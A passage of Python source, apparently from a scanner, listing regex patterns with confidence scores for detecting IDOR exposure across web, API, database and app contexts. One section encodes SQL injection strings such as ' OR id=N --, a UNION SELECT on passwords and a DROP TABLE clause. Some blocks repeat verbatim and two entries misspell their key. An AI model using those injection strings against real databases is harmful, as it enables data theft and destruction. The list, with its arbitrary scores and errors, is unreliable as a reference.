    {"desen": r"payment.*customer.*\d+", "guven": 0.95, "aciklama": "Payment customer"},
    {"desen": r"invoice.*user_id.*\d+", "guven": 0.88, "aciklama": "Invoice user ID"},
    {"desen": r"receipt.*account_id.*\d+", "guven": 0.87, "aciklama": "Receipt account"},
    
    # Analytics/Tracking IDOR
    {"desen": r"analytics.*user_\d+", "guven": 0.85, "aciklama": "Analytics user data"},
    {"desen": r"metrics.*account.*\d+", "guven": 0.82, "aciklama": "Metrics account"},
    {"desen": r"tracking.*user_id.*\d+", "guven": 0.87, "aciklama": "Tracking user ID"},
    {"desen": r"stats.*id.*\d+", "guven": 0.8, "aciklama": "Stats ID access"},
    {"desen": r"report.*user.*\d+", "guven": 0.88, "aciklama": "Report user data"},
    
    # Security/Auth Advanced IDOR
    {"desen": r"2fa.*user_\d+", "guven": 0.92, "aciklama": "2FA user setup"},
    {"desen": r"otp.*account.*\d+", "guven": 0.9, "aciklama": "OTP account access"},
    {"desen": r"biometric.*user_id.*\d+", "guven": 0.95, "aciklama": "Biometric user ID"},
    {"desen": r"oauth.*client.*\d+", "guven": 0.88, "aciklama": "OAuth client ID"},
    {"desen": r"saml.*user.*\d+", "guven": 0.87, "aciklama": "SAML user assertion"},
    
    # Advanced File Operations
    {"desen": r"chmod.*user_\d+", "guven": 0.85, "aciklama": "File permission user"},
    {"desen": r"chown.*id.*\d+", "guven": 0.87, "aciklama": "File ownership ID"},
    {"desen": r"symlink.*user.*\d+", "guven": 0.82, "aciklama": "Symlink user access"},
    {"desen": r"mount.*account.*\d+", "guven": 0.88, "aciklama": "Mount account"},
    {"desen": r"unmount.*user_id.*\d+", "guven": 0.85, "aciklama": "Unmount user ID"},
    
    # Memory/Performance IDOR
    {"desen": r"memory.*user_\d+", "guven": 0.8, "aciklama": "Memory user allocation"},
    {"desen": r"cpu.*account.*\d+", "guven": 0.82, "aciklama": "CPU account usage"},
    {"desen": r"disk.*user_id.*\d+", "guven": 0.85, "aciklama": "Disk user quota"},
    {"desen": r"bandwidth.*id.*\d+", "guven": 0.87, "aciklama": "Bandwidth ID limit"},
    {"desen": r"quota.*user.*\d+", "guven": 0.88, "aciklama": "Quota user limit"},
     # SQL Injection ile IDOR Kombinasyonu
    {"desen": r"SELECT.*FROM.*WHERE.*id\s*=\s*\d+", "guven": 0.95, "aciklama": "SQL sorgusu ile direkt ID erişimi"},
    {"desen": r"UPDATE.*SET.*WHERE.*user_id\s*=", "guven": 0.92, "aciklama": "User ID ile güncelleme"},
    {"desen": r"DELETE.*FROM.*WHERE.*id\s*IN\s*\(", "guven": 0.9, "aciklama": "ID listesi ile silme"},
    {"desen": r"INSERT.*INTO.*VALUES.*\(\s*\d+", "guven": 0.85, "aciklama": "Sabit ID ile ekleme"},
    {"desen": r"ORDER BY.*user_id.*DESC", "guven": 0.8, "aciklama": "User ID sıralama"},
    
    # API Endpoint IDOR Patternleri
    {"desen": r"/api/v\d+/users/\d+", "guven": 0.95, "aciklama": "API user endpoint"},
    {"desen": r"/api/admin/\d+/delete", "guven": 0.98, "aciklama": "Admin silme endpoint"},
    {"desen": r"/profile/\d+/edit", "guven": 0.9, "aciklama": "Profil düzenleme"},
    {"desen": r"/account/\d+/settings", "guven": 0.88, "aciklama": "Hesap ayarları"},
    {"desen": r"/user/\d+/private", "guven": 0.95, "aciklama": "Özel kullanıcı verisi"},
    
    # Session ve Cookie IDOR
    {"desen": r"session_id\s*=\s*\d+", "guven": 0.9, "aciklama": "Session ID manipülasyonu"},
    {"desen": r"user_token\s*=\s*[a-zA-Z0-9]+", "guven": 0.85, "aciklama": "Token manipülasyonu"},
    {"desen": r"auth_id\s*:\s*\d+", "guven": 0.92, "aciklama": "Auth ID değişimi"},
    {"desen": r"cookie.*user_id.*\d+", "guven": 0.88, "aciklama": "Cookie user ID"},
    {"desen": r"PHPSESSID.*\d+", "guven": 0.8, "aciklama": "PHP session ID"},
    
    # Database IDOR Patternleri
    {"desen": r"pk\s*=\s*\d+", "guven": 0.9, "aciklama": "Primary key erişimi"},
    {"desen": r"id\s*!=\s*current_user", "guven": 0.95, "aciklama": "Başka kullanıcı ID"},
    {"desen": r"owner_id\s*=\s*\$\{.*\}", "guven": 0.88, "aciklama": "Dinamik owner ID"},
    {"desen": r"creator_id\s*<>\s*\d+", "guven": 0.85, "aciklama": "Creator ID farklılığı"},
    {"desen": r"belongs_to.*\d+", "guven": 0.82, "aciklama": "Sahiplik kontrolü"},
    
    # Parameter Tampering IDOR
    {"desen": r"\?id=\d+", "guven": 0.9, "aciklama": "GET parameter ID"},
    {"desen": r"&user=\d+", "guven": 0.88, "aciklama": "User parameter"},
    {"desen": r"account_id=\d+", "guven": 0.92, "aciklama": "Account ID parameter"},
    {"desen": r"profile_id=\d+&", "guven": 0.85, "aciklama": "Profile ID parameter"},
    {"desen": r"object_id=\d+", "guven": 0.9, "aciklama": "Object ID parameter"},
    
    # File Access IDOR
    {"desen": r"/files/\d+/download", "guven": 0.95, "aciklama": "Dosya indirme"},
    {"desen": r"/uploads/user_\d+/", "guven": 0.92, "aciklama": "Kullanıcı upload klasörü"},
    {"desen": r"/documents/\d+\.pdf", "guven": 0.88, "aciklama": "Doküman erişimi"},
    {"desen": r"/images/profile_\d+\.", "guven": 0.8, "aciklama": "Profil resmi"},
    {"desen": r"/private/\d+/", "guven": 0.95, "aciklama": "Özel dosya alanı"},
    
    # JSON/XML Response IDOR
    {"desen": r'"user_id":\s*\d+', "guven": 0.85, "aciklama": "JSON user ID"},
    {"desen": r'"id":\s*\d+.*"private"', "guven": 0.9, "aciklama": "Özel JSON verisi"},
    {"desen": r'<user id="\d+">', "guven": 0.88, "aciklama": "XML user ID"},
    {"desen": r'"owner":\s*\d+', "guven": 0.92, "aciklama": "JSON owner ID"},
    {"desen": r'"account_id":\s*\d+', "guven": 0.87, "aciklama": "JSON account ID"},
    
    # Advanced IDOR Patterns
    {"desen": r"current_user\.id\s*!=\s*target_id", "guven": 0.95, "aciklama": "Kullanıcı ID karşılaştırması"},
    {"desen": r"if\s*\(\s*user_id\s*==\s*\d+\s*\)", "guven": 0.9, "aciklama": "Sabit user ID kontrolü"},
    {"desen": r"authorized_users.*\d+", "guven": 0.88, "aciklama": "Yetkili kullanıcı listesi"},
    {"desen": r"role.*admin.*\d+", "guven": 0.92, "aciklama": "Admin rol kontrolü"},
    {"desen": r"access_level.*\d+", "guven": 0.85, "aciklama": "Erişim seviyesi"},
    
    # Mobile App IDOR
    {"desen": r"device_id.*\d+", "guven": 0.8, "aciklama": "Cihaz ID"},
    {"desen": r"app_user_id.*\d+", "guven": 0.88, "aciklama": "Mobil kullanıcı ID"},
    {"desen": r"push_token.*\d+", "guven": 0.82, "aciklama": "Push token ID"},
    {"desen": r"installation_id.*\d+", "guven": 0.85, "aciklama": "Kurulum ID"},
    {"desen": r"client_id.*\d+", "guven": 0.87, "aciklama": "İstemci ID"},
    
    # E-commerce IDOR
    {"desen": r"/order/\d+/details", "guven": 0.95, "aciklama": "Sipariş detayları"},
    {"desen": r"/cart/\d+/items", "guven": 0.9, "aciklama": "Sepet öğeleri"},
    {"desen": r"/payment/\d+/info", "guven": 0.98, "aciklama": "Ödeme bilgileri"},
    {"desen": r"/invoice/\d+\.pdf", "guven": 0.92, "aciklama": "Fatura erişimi"},
    {"desen": r"/purchase/\d+/receipt", "guven": 0.88, "aciklama": "Satın alma makbuzu"},
    
    # Social Media IDOR
    {"desen": r"/posts/\d+/private", "guven": 0.9, "aciklama": "Özel gönderi"},
    {"desen": r"/messages/\d+/read", "guven": 0.95, "aciklama": "Mesaj okuma"},
    {"desen": r"/friend/\d+/profile", "guven": 0.85, "aciklama": "Arkadaş profili"},
    {"desen": r"/group/\d+/members", "guven": 0.88, "aciklama": "Grup üyeleri"},
    {"desen": r"/chat/\d+/history", "guven": 0.92, "aciklama": "Sohbet geçmişi"},
    
    # Banking/Financial IDOR
    {"desen": r"/account/\d+/balance", "guven": 0.98, "aciklama": "Hesap bakiyesi"},
    {"desen": r"/transaction/\d+/details", "guven": 0.96, "aciklama": "İşlem detayları"},
    {"desen": r"/card/\d+/info", "guven": 0.95, "aciklama": "Kart bilgileri"},
    {"desen": r"/loan/\d+/status", "guven": 0.92, "aciklama": "Kredi durumu"},
    {"desen": r"/investment/\d+/portfolio", "guven": 0.9, "aciklama": "Yatırım portföyü"},
    
    # Healthcare IDOR
    {"desen": r"/patient/\d+/records", "guven": 0.98, "aciklama": "Hasta kayıtları"},
    {"desen": r"/medical/\d+/history", "guven": 0.95, "aciklama": "Tıbbi geçmiş"},
    {"desen": r"/prescription/\d+/details", "guven": 0.92, "aciklama": "Reçete detayları"},
    {"desen": r"/appointment/\d+/info", "guven": 0.88, "aciklama": "Randevu bilgileri"},
    {"desen": r"/lab/\d+/results", "guven": 0.96, "aciklama": "Laboratuvar sonuçları"},
    
    # Education IDOR
    {"desen": r"/student/\d+/grades", "guven": 0.9, "aciklama": "Öğrenci notları"},
    {"desen": r"/course/\d+/materials", "guven": 0.85, "aciklama": "Ders materyalleri"},
    {"desen": r"/exam/\d+/results", "guven": 0.92, "aciklama": "Sınav sonuçları"},
    {"desen": r"/assignment/\d+/submission", "guven": 0.88, "aciklama": "Ödev teslimi"},
    {"desen": r"/transcript/\d+\.pdf", "guven": 0.95, "aciklama": "Transkript belgesi"},
    
    # HR/Employee IDOR
    {"desen": r"/employee/\d+/salary", "guven": 0.98, "aciklama": "Çalışan maaşı"},
    {"desen": r"/hr/\d+/evaluation", "guven": 0.92, "aciklama": "Performans değerlendirmesi"},
    {"desen": r"/payroll/\d+/details", "guven": 0.95, "aciklama": "Bordro detayları"},
    {"desen": r"/leave/\d+/request", "guven": 0.85, "aciklama": "İzin talebi"},
    {"desen": r"/personnel/\d+/file", "guven": 0.9, "aciklama": "Personel dosyası"},
    
    # Legal/Document IDOR
    {"desen": r"/contract/\d+/content", "guven": 0.95, "aciklama": "Sözleşme içeriği"},
    {"desen": r"/legal/\d+/document", "guven": 0.92, "aciklama": "Hukuki belge"},
    {"desen": r"/case/\d+/files", "guven": 0.9, "aciklama": "Dava dosyaları"},
    {"desen": r"/agreement/\d+/terms", "guven": 0.88, "aciklama": "Anlaşma şartları"},
    {"desen": r"/confidential/\d+/", "guven": 0.96, "aciklama": "Gizli belgeler"},
    
    # Cloud Storage IDOR
    {"desen": r"/bucket/\d+/objects", "guven": 0.9, "aciklama": "Depolama bucket"},
    {"desen": r"/storage/user_\d+/", "guven": 0.88, "aciklama": "Kullanıcı depolama"},
    {"desen": r"/cloud/\d+/files", "guven": 0.85, "aciklama": "Bulut dosyaları"},
    {"desen": r"/backup/\d+/restore", "guven": 0.92, "aciklama": "Yedek geri yükleme"},
    {"desen": r"/sync/\d+/data", "guven": 0.87, "aciklama": "Senkronizasyon verisi"},
    
    # Advanced Parameter Patterns
    {"desen": r"uuid=[a-f0-9-]{36}", "guven": 0.85, "aciklama": "UUID parameter"},
    {"desen": r"token=[a-zA-Z0-9]{32,}", "guven": 0.88, "aciklama": "Token parameter"},
    {"desen": r"key=[a-zA-Z0-9]+", "guven": 0.82, "aciklama": "Key parameter"},
    {"desen": r"hash=[a-f0-9]{32,}", "guven": 0.85, "aciklama": "Hash parameter"},
    {"desen": r"signature=[a-zA-Z0-9+/=]+", "guven": 0.87, "aciklama": "Signature parameter"},
    
    # Database Query Patterns
    {"desen": r"WHERE.*user_id.*!=.*current", "guven": 0.92, "aciklama": "Başka kullanıcı sorgusu"},
    {"desen": r"JOIN.*ON.*id.*=.*\d+", "guven": 0.88, "aciklama": "JOIN ile ID kontrolü"},
    {"desen": r"HAVING.*count.*>.*\d+", "guven": 0.8, "aciklama": "HAVING ile sayı kontrolü"},
    {"desen": r"LIMIT.*OFFSET.*\d+", "guven": 0.75, "aciklama": "Sayfalama manipülasyonu"},
    {"desen": r"UNION.*SELECT.*\d+", "guven": 0.9, "aciklama": "UNION ile ID seçimi"},
    
    # Error Message Patterns
    {"desen": r"User \d+ not found", "guven": 0.85, "aciklama": "Kullanıcı bulunamadı hatası"},
    {"desen": r"Invalid ID: \d+", "guven": 0.88, "aciklama": "Geçersiz ID hatası"},
    {"desen": r"Access denied for user \d+", "guven": 0.92, "aciklama": "Kullanıcı erişim reddedildi"},
    {"desen": r"Resource \d+ not accessible", "guven": 0.9, "aciklama": "Kaynak erişilemez"},
    {"desen": r"Permission error: ID \d+", "guven": 0.88, "aciklama": "İzin hatası ID"},
    
    # Framework Specific Patterns
    {"desen": r"@RequestParam.*id.*Integer", "guven": 0.85, "aciklama": "Spring ID parametresi"},
    {"desen": r"params\[:id\]", "guven": 0.88, "aciklama": "Rails ID parametresi"},
    {"desen": r"request\.GET\['id'\]", "guven": 0.9, "aciklama": "Django GET ID"},
    {"desen": r"\$_GET\['user_id'\]", "guven": 0.92, "aciklama": "PHP GET user ID"},
    {"desen": r"req\.params\.id", "guven": 0.87, "aciklama": "Express.js params ID"},
    
    # GraphQL IDOR Patterns
    {"desen": r"query.*user\(id:\s*\d+\)", "guven": 0.9, "aciklama": "GraphQL user query"},
    {"desen": r"mutation.*updateUser.*id:\s*\d+", "guven": 0.95, "aciklama": "GraphQL user mutation"},
    {"desen": r"subscription.*userId:\s*\d+", "guven": 0.88, "aciklama": "GraphQL subscription"},
    {"desen": r"fragment.*on User.*id", "guven": 0.82, "aciklama": "GraphQL fragment"},
    {"desen": r"variables.*userId.*\d+", "guven": 0.85, "aciklama": "GraphQL variables"},
    
    # REST API Patterns
    {"desen": r"PUT /api/users/\d+", "guven": 0.92, "aciklama": "REST PUT kullanıcı"},
    {"desen": r"DELETE /api/\w+/\d+", "guven": 0.95, "aciklama": "REST DELETE kaynağı"},
    {"desen": r"PATCH /api/accounts/\d+", "guven": 0.9, "aciklama": "REST PATCH hesap"},
    {"desen": r"GET /api/v\d+/private/\d+", "guven": 0.88, "aciklama": "REST GET özel"},
    {"desen": r"POST /api/admin/users/\d+", "guven": 0.96, "aciklama": "REST POST admin"},
    
    # Cookie/Session Advanced
    {"desen": r"Set-Cookie.*user_id=\d+", "guven": 0.85, "aciklama": "Cookie user ID set"},
    {"desen": r"sessionStorage.*user.*\d+", "guven": 0.82, "aciklama": "Session storage user"},
    {"desen": r"localStorage.*account.*\d+", "guven": 0.8, "aciklama": "Local storage account"},
    {"desen": r"document\.cookie.*id.*\d+", "guven": 0.87, "aciklama": "Document cookie ID"},
    {"desen": r"HttpOnly.*secure.*id=\d+", "guven": 0.9, "aciklama": "Secure cookie ID"},
    
    # WebSocket IDOR
    {"desen": r"ws://.*user/\d+", "guven": 0.88, "aciklama": "WebSocket user channel"},
    {"desen": r"socket\.emit.*user_id.*\d+", "guven": 0.85, "aciklama": "Socket emit user ID"},
    {"desen": r"room.*user_\d+", "guven": 0.82, "aciklama": "Socket room user"},
    {"desen": r"channel.*private.*\d+", "guven": 0.9, "aciklama": "Private channel ID"},
    {"desen": r"subscribe.*user:\d+", "guven": 0.87, "aciklama": "Subscribe user channel"},
    
    # XML/SOAP IDOR
    {"desen": r"<userId>\d+</userId>", "guven": 0.85, "aciklama": "XML user ID tag"},
    {"desen": r"<soap:Body>.*<id>\d+", "guven": 0.88, "aciklama": "SOAP body ID"},
    {"desen": r"xmlns.*user.*\d+", "guven": 0.8, "aciklama": "XML namespace user"},
    {"desen": r"<account id=\"\d+\"", "guven": 0.9, "aciklama": "XML account attribute"},
    {"dosen": r"CDATA.*user_id.*\d+", "guven": 0.82, "aciklama": "XML CDATA user ID"},
    
    # JWT/Token IDOR
    {"desen": r"eyJ.*user_id.*\d+", "guven": 0.9, "aciklama": "JWT user ID claim"},
    {"desen": r"Bearer.*\d+", "guven": 0.85, "aciklama": "Bearer token ID"},
    {"desen": r"Authorization.*user:\d+", "guven": 0.88, "aciklama": "Auth header user"},
    {"desen": r"X-User-Id:\s*\d+", "guven": 0.92, "aciklama": "Custom user ID header"},
    {"desen": r"refresh_token.*\d+", "guven": 0.87, "aciklama": "Refresh token ID"},
    
    # Database Injection IDOR
    {"desen": r"' OR id=\d+ --", "guven": 0.95, "aciklama": "SQL injection IDOR"},
    {"desen": r"UNION SELECT.*\d+.*password", "guven": 0.98, "aciklama": "UNION IDOR password"},
    {"desen": r"' AND user_id=\d+ #", "guven": 0.92, "aciklama": "SQL AND user ID"},
    {"desen": r"; DROP TABLE users WHERE id=\d+", "guven": 0.9, "aciklama": "SQL DROP IDOR"},
    {"desen": r"' OR 1=1 AND id=\d+", "guven": 0.88, "aciklama": "SQL boolean IDOR"},
    
    # NoSQL IDOR
    {"desen": r"\{\"_id\":\s*\d+\}", "guven": 0.85, "aciklama": "MongoDB ObjectId"},
    {"desen": r"db\.users\.find\(\{id:\d+\}\)", "guven": 0.9, "aciklama": "MongoDB find ID"},
    {"desen": r"collection.*user.*\d+", "guven": 0.82, "aciklama": "NoSQL collection user"},
    {"desen": r"document.*userId.*\d+", "guven": 0.87, "aciklama": "NoSQL document user"},
    {"desen": r"\$match.*user_id.*\d+", "guven": 0.85, "aciklama": "MongoDB aggregation"},
    
    # Redis/Cache IDOR
    {"desen": r"redis.*user:\d+", "guven": 0.85, "aciklama": "Redis user key"},
    {"desen": r"cache.*account_\d+", "guven": 0.82, "aciklama": "Cache account key"},
    {"desen": r"memcached.*user.*\d+", "guven": 0.8, "aciklama": "Memcached user"},
    {"desen": r"SET user:\d+", "guven": 0.87, "aciklama": "Redis SET user"},
    {"desen": r"GET session:\d+", "guven": 0.85, "aciklama": "Redis GET session"},
    
    # Advanced Response Patterns
    {"desen": r"HTTP/1\.1 200.*user_id.*\d+", "guven": 0.85, "aciklama": "HTTP response user ID"},
    {"desen": r"Content-Type.*user.*\d+", "guven": 0.8, "aciklama": "Content type user"},
    {"desen": r"X-User-Role.*\d+", "guven": 0.88, "aciklama": "User role header"},
    {"desen": r"Location:.*user/\d+", "guven": 0.9, "aciklama": "Redirect location user"},
    {"desen": r"ETag:.*user-\d+", "guven": 0.82, "aciklama": "ETag user identifier"},
    
    # File System IDOR
    {"desen": r"/var/www/users/\d+/", "guven": 0.9, "aciklama": "File system user path"},
    {"desen": r"upload_path.*user_\d+", "guven": 0.85, "aciklama": "Upload path user"},
    {"desen": r"temp/.*\d+\.tmp", "guven": 0.8, "aciklama": "Temporary file ID"},
    {"desen": r"logs/user_\d+\.log", "guven": 0.88, "aciklama": "User log file"},
    {"desen": r"backup.*user.*\d+", "guven": 0.87, "aciklama": "User backup file"},
    
    # Configuration IDOR
    {"desen": r"config.*user_id.*\d+", "guven": 0.85, "aciklama": "Config user ID"},
    {"desen": r"settings.*account.*\d+", "guven": 0.82, "aciklama": "Settings account"},
    {"desen": r"properties.*user.*\d+", "guven": 0.8, "aciklama": "Properties user"},
    {"desen": r"environment.*USER_ID.*\d+", "guven": 0.87, "aciklama": "Environment user ID"},
    {"desen": r"yaml.*userId:\s*\d+", "guven": 0.85, "aciklama": "YAML user ID"},
    
    # Advanced URL Patterns
    {"desen": r"/[a-z]+/\d+/[a-z]+/\d+", "guven": 0.88, "aciklama": "Nested ID structure"},
    {"desen": r"\?.*id=\d+.*&.*id=\d+", "guven": 0.9, "aciklama": "Multiple ID parameters"},
    {"desen": r"#/user/\d+/profile", "guven": 0.85, "aciklama": "Hash fragment user"},
    {"desen": r"redirect.*user.*\d+", "guven": 0.82, "aciklama": "Redirect user parameter"},
    {"desen": r"callback.*id.*\d+", "guven": 0.87, "aciklama": "Callback ID parameter"},
    
    # Cryptographic IDOR
    {"desen": r"encrypt.*user_id.*\d+", "guven": 0.88, "aciklama": "Encrypted user ID"},
    {"desen": r"decrypt.*account.*\d+", "guven": 0.9, "aciklama": "Decrypted account"},
    {"desen": r"hash.*user.*\d+", "guven": 0.85, "aciklama": "Hashed user ID"},
    {"desen": r"salt.*id.*\d+", "guven": 0.82, "aciklama": "Salted ID"},
    {"desen": r"cipher.*user_id.*\d+", "guven": 0.87, "aciklama": "Cipher user ID"},
    
    # Race Condition IDOR
    {"desen": r"concurrent.*user.*\d+", "guven": 0.85, "aciklama": "Concurrent user access"},
    {"desen": r"async.*user_id.*\d+", "guven": 0.82, "aciklama": "Async user ID"},
    {"desen": r"thread.*account.*\d+", "guven": 0.8, "aciklama": "Thread account access"},
    {"desen": r"lock.*user:\d+", "guven": 0.87, "aciklama": "Lock user resource"},
    {"desen": r"atomic.*id.*\d+", "guven": 0.85, "aciklama": "Atomic ID operation"},
    
    # Time-based IDOR
    {"desen": r"timestamp.*user.*\d+", "guven": 0.8, "aciklama": "Timestamp user"},
    {"desen": r"expires.*account.*\d+", "guven": 0.85, "aciklama": "Expires account"},
    {"desen": r"created_at.*user_id.*\d+", "guven": 0.82, "aciklama": "Created user ID"},
    {"desen": r"updated.*id.*\d+", "guven": 0.8, "aciklama": "Updated ID"},
    {"desen": r"ttl.*user:\d+", "guven": 0.87, "aciklama": "TTL user key"},
    
    # Complex Logic IDOR
    {"desen": r"if.*user_id.*==.*\d+.*else", "guven": 0.9, "aciklama": "Conditional user ID"},
    {"desen": r"switch.*account.*case.*\d+", "guven": 0.88, "aciklama": "Switch account case"},
    {"desen": r"ternary.*id.*\d+.*:", "guven": 0.85, "aciklama": "Ternary ID operation"},
    {"desen": r"lambda.*user.*\d+", "guven": 0.82, "aciklama": "Lambda user function"},
    {"desen": r"closure.*account_id.*\d+", "guven": 0.87, "aciklama": "Closure account ID"},
    
    # Logging IDOR
    {"desen": r"log.*user_id.*\d+", "guven": 0.85, "aciklama": "Log user ID"},
    {"desen": r"audit.*account.*\d+", "guven": 0.88, "aciklama": "Audit account access"},
    {"desen": r"trace.*user:\d+", "guven": 0.82, "aciklama": "Trace user activity"},
    {"desen": r"debug.*id.*\d+", "guven": 0.8, "aciklama": "Debug ID information"},
    {"desen": r"monitor.*user_id.*\d+", "guven": 0.87, "aciklama": "Monitor user ID"},
    
    # Machine Learning IDOR
    {"desen": r"model.*user_\d+", "guven": 0.8, "aciklama": "ML model user data"},
    {"desen": r"predict.*account.*\d+", "guven": 0.82, "aciklama": "Prediction account"},
    {"desen": r"training.*user_id.*\d+", "guven": 0.85, "aciklama": "Training user ID"},
    {"desen": r"dataset.*id.*\d+", "guven": 0.87, "aciklama": "Dataset ID access"},
    {"desen": r"feature.*user.*\d+", "guven": 0.8, "aciklama": "Feature user extraction"},
    
    # Blockchain/Crypto IDOR
    {"desen": r"wallet.*\d+", "guven": 0.9, "aciklama": "Wallet ID access"},
    {"desen": r"transaction.*user_\d+", "guven": 0.88, "aciklama": "Crypto transaction user"},
    {"desen": r"private_key.*\d+", "guven": 0.98, "aciklama": "Private key access"},
    {"desen": r"address.*user.*\d+", "guven": 0.85, "aciklama": "Crypto address user"},
    {"desen": r"smart_contract.*owner.*\d+", "guven": 0.92, "aciklama": "Smart contract owner"},
    
    # IoT Device IDOR
    {"desen": r"device.*user_\d+", "guven": 0.88, "aciklama": "IoT device user"},
    {"desen": r"sensor.*id.*\d+", "guven": 0.85, "aciklama": "Sensor ID access"},
    {"desen": r"gateway.*user.*\d+", "guven": 0.82, "aciklama": "Gateway user access"},
    {"desen": r"telemetry.*device_\d+", "guven": 0.87, "aciklama": "Telemetry device"},
    {"desen": r"firmware.*user_id.*\d+", "guven": 0.9, "aciklama": "Firmware user ID"},
    
    # Video/Streaming IDOR
    {"desen": r"stream.*user_\d+", "guven": 0.85, "aciklama": "Video stream user"},
    {"desen": r"playlist.*id.*\d+", "guven": 0.82, "aciklama": "Playlist ID access"},
    {"desen": r"video.*owner.*\d+", "guven": 0.88, "aciklama": "Video owner ID"},
    {"dosen": r"live.*user_id.*\d+", "guven": 0.87, "aciklama": "Live stream user"},
    {"desen": r"recording.*account.*\d+", "guven": 0.9, "aciklama": "Recording account"},
    
    # Gaming IDOR
    {"desen": r"player.*id.*\d+", "guven": 0.85, "aciklama": "Player ID access"},
    {"desen": r"game.*user_\d+", "guven": 0.82, "aciklama": "Game user data"},
    {"desen": r"score.*player.*\d+", "guven": 0.8, "aciklama": "Player score"},
    {"desen": r"inventory.*user_id.*\d+", "guven": 0.88, "aciklama": "Game inventory user"},
    {"desen": r"achievement.*player_\d+", "guven": 0.85, "aciklama": "Player achievement"},
    
    # Content Management IDOR
    {"desen": r"article.*author.*\d+", "guven": 0.85, "aciklama": "Article author ID"},
    {"desen": r"post.*user_id.*\d+", "guven": 0.88, "aciklama": "Post user ID"},
    {"desen": r"comment.*author_id.*\d+", "guven": 0.82, "aciklama": "Comment author"},
    {"desen": r"page.*editor.*\d+", "guven": 0.87, "aciklama": "Page editor ID"},
    {"desen": r"draft.*user.*\d+", "guven": 0.85, "aciklama": "Draft user access"},
    
    # Advanced Encoding IDOR
    {"desen": r"base64.*user.*\d+", "guven": 0.87, "aciklama": "Base64 user encoding"},
    {"desen": r"url_encode.*id.*\d+", "guven": 0.85, "aciklama": "URL encoded ID"},
    {"desen": r"hex.*user_id.*\d+", "guven": 0.82, "aciklama": "Hex user ID"},
    {"desen": r"unicode.*account.*\d+", "guven": 0.8, "aciklama": "Unicode account"},
    {"desen": r"escape.*user.*\d+", "guven": 0.85, "aciklama": "Escaped user data"},
    
    # Network Protocol IDOR
    {"desen": r"tcp.*user_\d+", "guven": 0.8, "aciklama": "TCP user connection"},
    {"desen": r"udp.*id.*\d+", "guven": 0.82, "aciklama": "UDP ID packet"},
    {"desen": r"http.*user_id.*\d+", "guven": 0.85, "aciklama": "HTTP user ID"},
    {"desen": r"websocket.*user.*\d+", "guven": 0.87, "aciklama": "WebSocket user"},
    {"desen": r"grpc.*account.*\d+", "guven": 0.88, "aciklama": "gRPC account call"},
    
    # Email/Communication IDOR
    {"desen": r"email.*user_\d+", "guven": 0.88, "aciklama": "Email user access"},
    {"desen": r"inbox.*id.*\d+", "guven": 0.9, "aciklama": "Inbox ID access"},
    {"desen": r"message.*sender.*\d+", "guven": 0.85, "aciklama": "Message sender ID"},
    {"desen": r"notification.*user_id.*\d+", "guven": 0.82, "aciklama": "Notification user"},
    {"desen": r"sms.*recipient.*\d+", "guven": 0.87, "aciklama": "SMS recipient ID"},
    
    # Geo-location IDOR
    {"desen": r"location.*user_\d+", "guven": 0.88, "aciklama": "Location user data"},
    {"desen": r"gps.*id.*\d+", "guven": 0.85, "aciklama": "GPS ID tracking"},
    {"desen": r"coordinates.*user.*\d+", "guven": 0.87, "aciklama": "Coordinates user"},
    {"desen": r"map.*account.*\d+", "guven": 0.82, "aciklama": "Map account access"},
    {"desen": r"route.*user_id.*\d+", "guven": 0.85, "aciklama": "Route user ID"},
    
    # Calendar/Scheduling IDOR
    {"desen": r"calendar.*user_\d+", "guven": 0.85, "aciklama": "Calendar user access"},
    {"desen": r"event.*owner.*\d+", "guven": 0.88, "aciklama": "Event owner ID"},
    {"desen": r"appointment.*user_id.*\d+", "guven": 0.87, "aciklama": "Appointment user"},
    {"desen": r"schedule.*account.*\d+", "guven": 0.82, "aciklama": "Schedule account"},
    {"desen": r"meeting.*organizer.*\d+", "guven": 0.85, "aciklama": "Meeting organizer"},
    
    # Subscription/Billing IDOR
    {"desen": r"subscription.*user_\d+", "guven": 0.9, "aciklama": "Subscription user"},
    {"desen": r"billing.*account.*\d+", "guven": 0.92, "aciklama": "Billing account"},
    {"desen": r"payment.*customer.*\d+", "guven": 0.95, "aciklama": "Payment customer"},
    {"desen": r"invoice.*user_id.*\d+", "guven": 0.88, "aciklama": "Invoice user ID"},
    {"desen": r"receipt.*account_id.*\d+", "guven": 0.87, "aciklama": "Receipt account"},
    
    # Analytics/Tracking IDOR
    {"desen": r"analytics.*user_\d+", "guven": 0.85, "aciklama": "Analytics user data"},
    {"desen": r"metrics.*account.*\d+", "guven": 0.82, "aciklama": "Metrics account"},
    {"desen": r"tracking.*user_id.*\d+", "guven": 0.87, "aciklama": "Tracking user ID"},
    {"desen": r"stats.*id.*\d+", "guven": 0.8, "aciklama": "Stats ID access"},
    {"desen": r"report.*user.*\d+", "guven": 0.88, "aciklama": "Report user data"},
    
    # Security/Auth Advanced IDOR
    {"desen": r"2fa.*user_\d+", "guven": 0.92, "aciklama": "2FA user setup"},
    {"desen": r"otp.*account.*\d+", "guven": 0.9, "aciklama": "OTP account access"},
    {"desen": r"biometric.*user_id.*\d+", "guven": 0.95, "aciklama": "Biometric user ID"},
    {"desen": r"oauth.*client.*\d+", "guven": 0.88, "aciklama": "OAuth client ID"},
    {"desen": r"saml.*user.*\d+", "guven": 0.87, "aciklama": "SAML user assertion"},
    
    # Advanced File Operations
    {"desen": r"chmod.*user_\d+", "guven": 0.85, "aciklama": "File permission user"},
    {"desen": r"chown.*id.*\d+", "guven": 0.87, "aciklama": "File ownership ID"},
    {"desen": r"symlink.*user.*\d+", "guven": 0.82, "aciklama": "Symlink user access"},
    {"desen": r"mount.*account.*\d+", "guven": 0.88, "aciklama": "Mount account"},
    {"desen": r"unmount.*user_id.*\d+", "guven": 0.85, "aciklama": "Unmount user ID"},
    
    # Memory/Performance IDOR
    {"desen": r"memory.*user_\d+", "guven": 0.8, "aciklama": "Memory user allocation"},
    {"desen": r"cpu.*account.*\d+", "guven": 0.82, "aciklama": "CPU account usage"},
    {"desen": r"disk.*user_id.*\d+", "guven": 0.85, "aciklama": "Disk user quota"},
    {"desen": r"bandwidth.*id.*\d+", "guven": 0.87, "aciklama": "Bandwidth ID limit"},
    {"desen": r"quota.*user.*\d+", "guven": 0.88, "aciklama": "Quota user limit"},
    
    # Advanced Validation Bypass
    {"desen": r"validate.*user_id.*!=.*\d+", "guven": 0.9, "aciklama": "Validation bypass user"},
    {"desen": r"sanitize.*account.*\d+", "guven": 0.85, "aciklama": "Sanitization account"},
    {"desen": r"filter.*id.*\d+", "guven": 0.82, "aciklama": "Filter ID bypass"},
